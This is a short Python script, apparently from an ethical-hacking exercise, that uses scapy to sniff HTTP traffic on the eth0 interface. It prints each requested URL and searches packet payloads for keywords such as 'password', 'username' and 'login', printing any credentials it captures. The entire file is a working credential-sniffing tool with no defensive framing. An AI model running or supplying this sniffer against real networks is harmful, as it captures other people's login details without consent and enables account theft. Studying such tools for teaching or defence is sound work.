#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import optparse


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["password", "pass", "username", "user", "login"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP request >>>" + url)

        login_info = get_login(packet)

        if login_info:
            print("\n\n [+] Entered username and Password >>" + login_info +"\n\n")


sniff("eth0")
